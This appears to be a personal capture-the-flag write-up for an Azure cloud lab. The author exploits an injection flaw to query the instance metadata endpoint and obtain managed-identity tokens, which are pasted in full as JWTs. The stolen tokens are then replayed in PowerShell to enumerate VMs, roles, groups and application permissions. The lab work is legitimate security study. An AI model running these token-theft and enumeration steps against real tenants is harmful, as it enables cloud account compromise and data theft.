
#### 🚀 - Flags
---
1) Sudomain of "atomic-nuclear.site"
I found it using this website:
https://pentest-tools.com/information-gathering/find-subdomains-of-domain
Regular tools like subfinder don't really work on it, since it's hosted in Azure. 
Subdomain is:
`internal.atomic-nuclear.site   -   52.186.65.36`
Reachable at http://52.186.65.36

Injection vulnerability in organization input, payload:
curl -H "Metadata:true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"

eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6InoxcnNZSEhKOS04bWdndDRIc1p1OEJLa0JQdyIsImtpZCI6InoxcnNZSEhKOS04bWdndDRIc1p1OEJLa0JQdyJ9.eyJhdWQiOiJodHRwczovL21hbmFnZW1lbnQuYXp1cmUuY29tLyIsImlzcyI6Imh0dHBzOi8vc3RzLndpbmRvd3MubmV0LzE0MzE5OGM0LTc3YmUtNDJmNy1iMThlLTk1YzViNjkzZTZiOS8iLCJpYXQiOjE3MzY0NzI1NDksIm5iZiI6MTczNjQ3MjU0OSwiZXhwIjoxNzM2NTU5MjQ5LCJhaW8iOiJrMkJnWUZqYjJSTm1vemJaby9YWlBabjNiVzExQUE9PSIsImFwcGlkIjoiN2RlOTA2NWMtMmQ0Mi00YmM3LTg0MGYtZTY4Njk2ZGI1M2NjIiwiYXBwaWRhY3IiOiIyIiwiZ3JvdXBzIjpbIjg1OWU4ZWRkLTA1OWItNDc2ZC1hYWQ3LWMxZGEzOTZiZWMyMSJdLCJpZHAiOiJodHRwczovL3N0cy53aW5kb3dzLm5ldC8xNDMxOThjNC03N2JlLTQyZjctYjE4ZS05NWM1YjY5M2U2YjkvIiwiaWR0eXAiOiJhcHAiLCJvaWQiOiI4NmNhMzk1NS02YzdlLTQ4ZDUtOWU4ZC1iNmIxZDE3M2M4YzAiLCJyaCI6IjEuQUhBQXhKZ3hGTDUzOTBLeGpwWEZ0cFBtdVVaSWYza0F1dGRQdWtQYXdmajJNQlBFQUFCd0FBLiIsInN1YiI6Ijg2Y2EzOTU1LTZjN2UtNDhkNS05ZThkLWI2YjFkMTczYzhjMCIsInRpZCI6IjE0MzE5OGM0LTc3YmUtNDJmNy1iMThlLTk1YzViNjkzZTZiOSIsInV0aSI6ImhPV3lUSnFZMzAtMUlvYkVjOUdzQUEiLCJ2ZXIiOiIxLjAiLCJ4bXNfaWRyZWwiOiI3IDE4IiwieG1zX21pcmlkIjoiL3N1YnNjcmlwdGlvbnMvYjc4YjRmNGEtZDk5My00OWQzLTlmOTgtYzg3NTJjZTljNzExL3Jlc291cmNlZ3JvdXBzL0lULVJHL3Byb3ZpZGVycy9NaWNyb3NvZnQuQ29tcHV0ZS92aXJ0dWFsTWFjaGluZXMvaXQtdm0iLCJ4bXNfdGNkdCI6MTYyOTk4MzYwMn0.VF0QU17Fe-MCEB2ANf_yrI4aDMLC1LrfikfRRWhP48gehwnYI7uhx8EsN8EMIfb8Jd-pS7QW1cHysSIWpDXsXaIYYZEdRZrDNU0tCvlFuigJ8VHHPP8lZT5-SDobKJjKCmF0ycDwyGTv7DeVvq3dzdOR_FJO1C6vZ9KR6Wo3M9cobeii8MJ8w4xOVtThQV1xEoo8f6EzNJpU_jaZuEUpMvdr1q_gNfDUpQwzoCk00f0eGcnNbNQoyOZK4ZySzELOO9gPRue8fdWhfpBE6-UOFLxMiCQb5YFIf0LIaO4gHMlXvTCL7XLPXi8HX2TT9BgmRJqPWfswXFUXw7maQzF2oQ


2) Claim in ISS value of JWT token?: 
we need to break down the token using website jwt.io, we obtain that iss has this value:
https://sts.windows.net/143198c4-77be-42f7-b18e-95c5b693e6b9/

3) Tenant ID of the organization? I found it in the token under the value "tid"
`143198c4-77be-42f7-b18e-95c5b693e6b9`

4) I obtain the subscription ID from the token checking website jwt.io, it's next to /subscriptions/.../
I log into the account:
`Connect-AzAccount -AccessToken $token -AccountId b78b4f4a-d993-49d3-9f98-c8752ce9c711`

I obtain the name of the subscription:
`Demo-Lab-Testing`

5) I get all VMs:
`$vms = Get-AzVM`
List them:
`$vms | ForEach-Object { $_.Name }`
I got the VM's name:
`it-vm`
Now, I get the VM's Principal ID and check for its assigned roles:
```
PS /home/slyjose> $vm = Get-AzVM -ResourceGroupName "IT-RG" -Name "it-vm"                               
PS /home/slyjose> $principalId = $vm.Identity.PrincipalId                
PS /home/slyjose> Write-Output "Principal ID: $principalId"
Principal ID: 86ca3955-6c7e-48d5-9e8d-b6b1d173c8c0
PS /home/slyjose> Get-AzRoleAssignment -ObjectId 86ca3955-6c7e-48d5-9e8d-b6b1d173c8c0
```

I see that the Role Assignment is reader.

6) To figure out where the role is assigned, i check all the roles and search for the "custom-role-definition"

`Get-AzRoleAssignment`
Then I see the Scope section:
`/subscriptions/b78b4f4a-d993-49d3-9f98-c8752ce9c711/resourceGroups/IT-RG/providers/Microsoft.Compute/virtualMachines/it-vm`

7) I check for the description of the role:
`Get-AzRoleDefinition custom-role-definition`

Then I see the actions:
`Microsoft.Resources/subscriptions/resourceGroups/read`

8) In order to get permissions to the graph we need a new token, since the first obtained token does not have enough permissions, also we pulled that one from management.azure.com. Now we pull a token from the graph.microsoft.com:

curl -H "Metadata:true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://graph.microsoft.com/"

I get the token: 

eyJ0eXAiOiJKV1QiLCJub25jZSI6InBYWm02dGI5VGtiWWVYTUhweGd3Q1hyQk1jYk9IcDJWS0xjOFV0MUpSQmciLCJhbGciOiJSUzI1NiIsIng1dCI6InoxcnNZSEhKOS04bWdndDRIc1p1OEJLa0JQdyIsImtpZCI6InoxcnNZSEhKOS04bWdndDRIc1p1OEJLa0JQdyJ9.eyJhdWQiOiJodHRwczovL2dyYXBoLm1pY3Jvc29mdC5jb20vIiwiaXNzIjoiaHR0cHM6Ly9zdHMud2luZG93cy5uZXQvMTQzMTk4YzQtNzdiZS00MmY3LWIxOGUtOTVjNWI2OTNlNmI5LyIsImlhdCI6MTczNjQ4MjUwMCwibmJmIjoxNzM2NDgyNTAwLCJleHAiOjE3MzY1NjkyMDAsImFpbyI6ImsyQmdZT0RVRDFxVE8rbkl0YTMrUWV0cm9rcWtBQT09IiwiYXBwX2Rpc3BsYXluYW1lIjoiaXQtdm0iLCJhcHBpZCI6IjdkZTkwNjVjLTJkNDItNGJjNy04NDBmLWU2ODY5NmRiNTNjYyIsImFwcGlkYWNyIjoiMiIsImlkcCI6Imh0dHBzOi8vc3RzLndpbmRvd3MubmV0LzE0MzE5OGM0LTc3YmUtNDJmNy1iMThlLTk1YzViNjkzZTZiOS8iLCJpZHR5cCI6ImFwcCIsIm9pZCI6Ijg2Y2EzOTU1LTZjN2UtNDhkNS05ZThkLWI2YjFkMTczYzhjMCIsInJoIjoiMS5BSEFBeEpneEZMNTM5MEt4anBYRnRwUG11UU1BQUFBQUFBQUF3QUFBQUFBQUFBREVBQUJ3QUEuIiwic3ViIjoiODZjYTM5NTUtNmM3ZS00OGQ1LTllOGQtYjZiMWQxNzNjOGMwIiwidGVuYW50X3JlZ2lvbl9zY29wZSI6IkFTIiwidGlkIjoiMTQzMTk4YzQtNzdiZS00MmY3LWIxOGUtOTVjNWI2OTNlNmI5IiwidXRpIjoiSGtYRDJpOXRya20wbkVHay1UQVFBQSIsInZlciI6IjEuMCIsIndpZHMiOlsiZjJlZjk5MmMtM2FmYi00NmI5LWI3Y2YtYTEyNmVlNzRjNDUxIiwiMDk5N2ExZDAtMGQxZC00YWNiLWI0MDgtZDVjYTczMTIxZTkwIl0sInhtc19pZHJlbCI6IjI0IDciLCJ4bXNfdGNkdCI6MTYyOTk4MzYwMn0.DR7tOBHhwxaruDcxw08rczlcPEXZV6YLrV3LZ3CyTznc2_UF8hICem2yPcLTs5bVAhbGFpEJHKbWluYWaICT0jWc_J6NDVJJPKGtIhaug50L7MwLzT-F5k8hjeYiVHoq-B6MtmKQ7o6rBMoy2ikls6vI9szpu64lDWCzBXTCTKqyvTb4Nv0gX5EfraLZ_3qbMmJUw9xHIWsX4UtlR8kCaXTyve0vlMKixJkNTlhGEKoYzV49iOJrRKAGA0Bo5mIvMc_SiUkmZ0Fy17Fas6Gpf8NqTnzX-sqXXl-K9YWA8_sb3E0ABdwk0QJVXcMFQ-DW_tXpH8fPmyFFKsjPTLRrYw

To see all groups and all users in Powershell Azure I need to install this:

`Install-Module -Name Microsoft.Graph -Scope CurrentUser`
`Import-Module Microsoft.Graph`

Now i connect to the graph only using the new token:
`Connect-MgGraph -AccessToken ($token | ConvertTo-SecureString -AsPlainText -Force)`

Once authenticated, I get the group ID:

`Get-MgGroup -Filter "displayName eq 'IT Ops'" | Select-Object Id, DisplayName` 

Now, I check the group members:
`Get-MgGroupMember -GroupId "e4beb1e5-bae3-4bb4-8943-51f4e9148ff7" | Format-List`

I see the email: it@atomic-nuclear.site

9) First I see all the applications
`Get-MgApplication` 
I get the prod-app id: `ad28eb13-e4d0-464f-a30e-33399ab86e12`
Now I check the owners:
`Get-MgApplicationOwner -ApplicationId ad28eb13-e4d0-464f-a30e-33399ab86e12 | Format-List`
I see the display name is IT

10) First I obtain the application object ID
```
PS /home/slyjose> $displayName = "dev-app"  
PS /home/slyjose> $app = Get-MgApplication -Filter "displayName eq '$displayName'"
PS /home/slyjose> $app.Id    
c4809841-4b3d-457e-a136-016568410df5 
```

Now I get the application ID
```
PS /home/slyjose> 
PS /home/slyjose> $app2 = Get-MgApplication -ApplicationId $app.Id
```
With the correct ID, I check for the permissions assigned to the app
```
PS /home/slyjose> $app2.requiredResourceAccess | ConvertTo-Json   
{
  "ResourceAccess": [
    {
      "Id": "df021288-bdef-4463-88db-98f22de89214",
      "Type": "Role"
    },
    {
      "Id": "b4e74841-8e56-480b-be8b-910348b18b4c",
      "Type": "Scope"
    }
  ],
  "ResourceAppId": "00000003-0000-0000-c000-000000000000",
  "AdditionalProperties": {}
}
```
Finally I see the details of the Microsoft Graph Permission
```
PS /home/slyjose> $res=Get-MgServicePrincipal -Filter "DisplayName eq 'Microsoft Graph'"
PS /home/slyjose> $res.AppRoles | Where-Object {$_.ID -eq 'df021288-bdef-4463-88db-98f22de89214’} | ConvertTo-Json
{
  "AllowedMemberTypes": [
    "Application"
  ],
  "Description": "Allows the app to read user profiles without a signed in user.",
  "DisplayName": "Read all users' full profiles",
  "Id": "df021288-bdef-4463-88db-98f22de89214",
  "IsEnabled": true,
  "Origin": "Application",
  "Value": "User.Read.All",
  "AdditionalProperties": {}
}
```
The value of the role is User.Read.All


### Properties
---
📆 created   {{08-01-2025}} 23:25
🏷️ tags: #cloud #azure 

---
